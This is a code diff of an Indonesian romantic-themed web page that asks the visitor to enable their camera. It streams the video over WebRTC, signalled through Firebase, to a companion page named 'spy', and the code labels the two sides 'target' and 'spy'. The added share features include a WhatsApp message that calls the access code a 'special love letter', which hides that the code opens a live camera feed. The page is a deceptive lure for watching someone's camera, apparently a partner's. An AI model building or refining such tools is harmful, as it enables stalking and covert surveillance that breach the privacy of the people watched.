@@ -25,33 +25,53 @@
         h1 { color: #ff4081; margin-bottom: 20px; }
         #status { margin: 20px 0; min-height: 24px; }
         #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
-        #shareLink { 
-            background: #f0f0f0; 
-            padding: 10px; 
-            border-radius: 5px; 
-            margin: 10px 0;
-            font-family: monospace;
-            word-break: break-all;
+        .share-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
             display: none;
+            border-left: 4px solid #ff4081;
+        }
+        .room-code {
+            font-size: 2em;
+            font-weight: bold;
+            color: #ff4081;
+            letter-spacing: 3px;
+            margin: 15px 0;
+            font-family: monospace;
+        }
+        .share-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+            flex-wrap: wrap;
         }
         button {
             background: #ff4081;
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 12px 20px;
             border-radius: 25px;
             cursor: pointer;
-            font-size: 16px;
-            margin: 10px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .qr-container {
-            margin: 20px 0;
-            display: none;
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
-        #qrcode {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto;
+        .copy-btn {
+            background: #4CAF50;
+        }
+        .note {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+            font-style: italic;
         }
     </style>
 </head>
@@ -60,24 +80,44 @@
         <h1>💖 Untuk Pacarku</h1>
         <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
         
-        <button onclick="startCamera()">📸 Izinkan Kamera</button>
+        <button onclick="startCamera()" id="startBtn">
+            📸 Izinkan Kamera
+        </button>
         
         <div id="status">Klik tombol di atas untuk memulai</div>
         
-        <div id="shareLink"></div>
-        
-        <div class="qr-container" id="qrContainer">
-            <p>Scan QR code ini dari HP lain:</p>
-            <canvas id="qrcode"></canvas>
+        <div class="share-section" id="shareSection">
+            <h3>🎯 Kirim kode ini ke pacarmu:</h3>
+            <div class="room-code" id="roomCode"></div>
+            
+            <div class="share-buttons">
+                <button onclick="copyRoomCode()" class="copy-btn">
+                    📋 Salin Kode
+                </button>
+                <button onclick="shareViaWhatsApp()">
+                    💬 WhatsApp
+                </button>
+                <button onclick="generateQR()" id="qrBtn">
+                    📱 QR Code
+                </button>
+            </div>
+            
+            <div id="qrContainer" style="margin: 20px 0; display: none;">
+                <p>Scan QR code ini:</p>
+                <img id="qrcode" style="width: 200px; height: 200px;">
+            </div>
+            
+            <div class="note">
+                Kode akan aktif selama 30 menit
+            </div>
         </div>
         
         <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <!-- Firebase & QR Code -->
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     
     <script>
         // ========== CONFIG ==========
@@ -103,7 +143,7 @@
         
         // ========== GENERATE ROOM ID ==========
         function generateRoomId() {
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // No confusing chars
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
             let result = '';
             for (let i = 0; i < 6; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -113,11 +153,11 @@
         
         // ========== START CAMERA ==========
         async function startCamera() {
-            const btn = event.target;
+            const btn = document.getElementById('startBtn');
             const status = document.getElementById('status');
             
             btn.disabled = true;
-            btn.textContent = "🔄 Memulai...";
+            btn.innerHTML = "🔄 Memulai...";
             
             try {
                 // 1. GET CAMERA
@@ -133,42 +173,37 @@
                 
                 // 2. CREATE ROOM
                 roomId = generateRoomId();
-                await database.ref('rooms/' + roomId).remove(); // Clean old
                 
-                // 3. CREATE SHARE LINK
-                const shareLink = `${window.location.origin}${window.location.pathname.replace('target_auto.html', 'spy_auto.html')}?room=${roomId}`;
+                // Clean old room data
+                await database.ref('rooms/' + roomId).remove();
                 
-                document.getElementById('shareLink').style.display = 'block';
-                document.getElementById('shareLink').innerHTML = `
-                    <strong>Share link ini ke pacarmu:</strong><br>
-                    <a href="${shareLink}" target="_blank">${shareLink}</a>
-                    <br><br>
-                    <strong>Atau scan QR code:</strong>
-                `;
-                
-                // 4. GENERATE QR CODE
-                document.getElementById('qrContainer').style.display = 'block';
-                QRCode.toCanvas(document.getElementById('qrcode'), shareLink, {
-                    width: 200,
-                    margin: 2,
-                    color: {
-                        dark: '#ff4081',
-                        light: '#ffffff'
-                    }
+                // Set room data
+                await database.ref('rooms/' + roomId).set({
+                    created: Date.now(),
+                    active: true
                 });
                 
-                // 5. SETUP WEBRTC
+                // 3. SHOW SHARE SECTION
+                document.getElementById('roomCode').textContent = roomId;
+                document.getElementById('shareSection').style.display = 'block';
+                
+                // 4. SETUP WEBRTC
                 setupWebRTC();
                 
-                // 6. SETUP LISTENERS
+                // 5. SETUP LISTENERS
                 setupListeners();
                 
-                status.innerHTML = "✅ Kamera aktif! Bagikan link di atas ke pacarmu";
+                status.innerHTML = "✅ Kamera aktif! Kirim kode di atas ke pacarmu";
+                
+                // Auto-copy code
+                setTimeout(() => {
+                    copyRoomCode();
+                }, 500);
                 
             } catch (error) {
                 status.innerHTML = `❌ Error: ${error.message}`;
                 btn.disabled = false;
-                btn.textContent = "📸 Izinkan Kamera";
+                btn.innerHTML = "📸 Izinkan Kamera";
             }
         }
         
@@ -190,14 +225,21 @@
                     database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
                 }
             };
+            
+            peerConnection.onconnectionstatechange = () => {
+                if (peerConnection.connectionState === 'connected') {
+                    document.getElementById('status').innerHTML = "🔴 Terhubung dengan pacar!";
+                }
+            };
         }
         
         // ========== SETUP LISTENERS ==========
         function setupListeners() {
+            // Listen for offer from spy
             offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                 const offer = snapshot.val();
                 if (offer && peerConnection.signalingState === 'stable') {
-                    console.log("📥 Offer received from spy");
+                    console.log("📥 Offer received");
                     
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                     
@@ -205,21 +247,50 @@
                     await peerConnection.setLocalDescription(answer);
                     
                     await database.ref(`rooms/${roomId}/answer`).set(answer);
-                    
-                    document.getElementById('status').innerHTML = "🔴 Terhubung dengan pacar!";
                 }
             });
             
+            // Listen for spy ICE candidates
             candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
                 const candidate = snapshot.val();
                 if (candidate) {
                     try {
                         await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                     } catch (e) {
-                        console.warn("Failed to add ICE candidate:", e);
+                        console.warn("ICE candidate error:", e);
                     }
                 }
             });
+        }
+        
+        // ========== SHARE FUNCTIONS ==========
+        function copyRoomCode() {
+            navigator.clipboard.writeText(roomId).then(() => {
+                const status = document.getElementById('status');
+                status.innerHTML = "✅ Kode disalin! Kirim ke pacarmu";
+            });
+        }
+        
+        function shareViaWhatsApp() {
+            const text = `💖 Hai sayang! Aku buatkan surat cinta khusus untukmu. Gunakan kode ini: ${roomId} untuk melihatnya di: ${window.location.origin}${window.location.pathname.replace('target_fixed.html', 'spy_fixed.html')}`;
+            const url = `https://wa.me/?text=${encodeURIComponent(text)}`;
+            window.open(url, '_blank');
+        }
+        
+        function generateQR() {
+            const qrBtn = document.getElementById('qrBtn');
+            const qrContainer = document.getElementById('qrContainer');
+            
+            if (qrContainer.style.display === 'none') {
+                // Generate QR code using Google Charts API (no library needed)
+                const qrUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${roomId}&choe=UTF-8`;
+                document.getElementById('qrcode').src = qrUrl;
+                qrContainer.style.display = 'block';
+                qrBtn.innerHTML = '❌ Tutup QR';
+            } else {
+                qrContainer.style.display = 'none';
+                qrBtn.innerHTML = '📱 QR Code';
+            }
         }
         
         // ========== CLEANUP ==========
@@ -235,4 +306,4 @@
         window.addEventListener('pagehide', cleanup);
     </script>
 </body>
-        </html>
+    </html>
